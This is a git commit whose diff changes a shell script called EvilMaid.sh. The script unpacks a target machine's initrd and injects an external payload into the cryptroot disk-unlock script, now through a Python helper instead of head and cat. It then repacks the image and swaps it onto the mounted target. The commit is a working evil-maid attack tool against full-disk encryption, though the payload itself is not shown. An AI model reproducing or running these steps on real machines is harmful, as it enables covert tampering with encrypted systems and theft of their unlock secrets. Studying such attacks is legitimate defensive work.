b6da171fa2c42f42bee6913e57c1c52d1544196c
Elías Orozco <zwitox@gmail.com>
2022-08-09 19:43:54 -0500

    Updated with python functionality

--- Evil-Maid/EvilMaid.sh
+++ Evil-Maid/EvilMaid.sh
@@ -8,12 +8,10 @@ mkdir ~/out
 cd ~/out
 lsinitrd --unpack ~/target/$initrd
 cd scripts/local-top
-head -n -2 cryptroot > cryptroot2 && cat $wdir/payload.txt >> cryptroot2
-mv cryptroot2 cryptroot
+python3 $wdir/edit.py cryptroot $wdir/payload.txt
 cd ~/out
 find . | cpio -H newc -o | gzip -9 > ~/$initrd
 sudo mv ~/$initrd ~/target/$initrd
 sudo umount ~/target
 echo "Evil Maid Completed"
 exit 0
-
